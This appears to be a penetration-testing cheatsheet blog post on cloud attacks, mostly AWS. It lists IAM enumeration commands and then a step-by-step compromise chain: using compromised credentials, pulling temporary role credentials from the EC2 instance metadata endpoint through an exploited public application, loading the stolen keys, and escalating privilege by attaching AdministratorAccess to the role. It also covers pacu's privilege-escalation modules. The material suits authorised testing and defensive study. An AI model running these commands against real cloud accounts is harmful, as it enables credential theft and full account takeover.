---
layout: post
title: Cloud Notes
date: 2024-07-01
tags: [Cheatsheet]
---

# Cloud

### AWS

```bash
# IAM Login
https://console.aws.amazon.com/
# SSO Login
https://Org-Name.awsapps.com/start

# Programmatic Access (CLI)
$ aws configure --profile atomic-nuclear
AWS Access Key ID: [fill in]
AWS Secret Access Key: [fill in]

# Get information about configured identity
$ aws sts get-caller-identity --profile atomic-nuclear

# AWS CLI Stored Credentials Location
C:\Users\UserName\.aws
/home/UserName/.aws

# Enumeration
# Users
$ aws iam list-users
$ aws iam list-groups-for-user --user-name [user-name]
$ aws iam list-attached-user-policies --user-name [user-name]
$ aws iam list-user-policies --user-name [user-name]
# Groups
$ aws iam list-groups 
$ aws iam get-group --group-name [group-name]
$ aws iam list-attached-group-policies --group-name [group-name]
$ aws iam list-group-policies --group-name [group-name]
# Roles
$ aws iam list-roles 
$ aws iam list-attached-role-policies --role-name [role-name]
$ aws iam list-role-policies --role-name [role-name]
# Policies
$ aws iam list-policies 
$ aws iam get-policy --policy-arn [policy-arn]
$ aws iam list-policy-versions --policy-arn [policy-arn]
$ aws iam get-policy-version --policy-arn policy-arn --version-id [version-id]
$ aws iam get-user-policy --user-name user-name --policy-name [policy-name]
$ aws iam get-group-policy --group-name group-name --policy-name [policy-name] 
$ aws iam get-role-policy --role-name role-name --policy-name [policy-name]

# Configure Initial Compromised User Credentials
$ aws configure --profile auditor 

# Enumerate Cloud Services in an Organization AWS Account
$ aws ec2 describe-instances --profile auditor

# Exploit Public Facing Application Running on EC2 instance and Retrieve Temporary Credentials
$ curl http://169.254.169.254/latest/meta-data/iam/security-credentials/jump-ec2-role

# Configure and Validate Temporary Credential in AWS CLI
$ aws configure set aws_access_key_id [key-id] --profile ec2
$ aws configure set aws_secret_access_key [key-id] --profile ec2
$ aws configure set aws_session_token [token] --profile ec2
$ aws sts get-caller-identity --profile ec2

# Get the Managed Policy Attached to EC2 Instance
$ aws iam list-attached-role-policies --role-name jump-ec2-role --profile 
auditor

# Retrieves the specified inline policy document that is embedded on the ec2 instance role
$ aws iam list-role-policies --role-name jump-ec2-role --profile auditor

# Get the permissions in inline policy 
$ aws iam get-role-policy --role-name jump-ec2-role --policy-name jump-inline-policy --profile auditor

# Escalate privilege by attaching administrator policy to itself 
$ aws iam attach-role-policy --policy-arn  arn:aws:iam::aws:policy/AdministratorAccess --role-name jump-ec2-role --profile ec2

# Again, check the managed Policy Attached to EC2 Instance
$ aws iam list-attached-role-policies --role-name jump-ec2-role --profile auditor
```

##### Using Automated Tool `pacu`

```bash
$ sudo apt install pacu -y
$ pacu
pacu> set_keys
# List all modules
pacu> ls
# Run an AWS CLI command directly.
pacu> aws <command>
# Execute a module
pacu> run/exec <module name>
# Get the permission of current logged-in user 
pacu> exec iam__enum_permissions whoami
# Enumerate ec2 instance and get the public ip addresses
pacu> exec ec2__enum data EC2
# Enumerate privilege escalation permission and exploit it 
pacu> exec iam__privesc_scan
```

### Azure

```bash
export AZURE_CLIENT_ID = <app-id>
export AZURE_TENANT_ID = <tenant-id>
export AZURE_CLIENT_SECRET = <app-secret>
```



### GCP

```bash
export GOOGLE_APPLICATION_CREDENTIALS = <Service Account Json File Path>
```

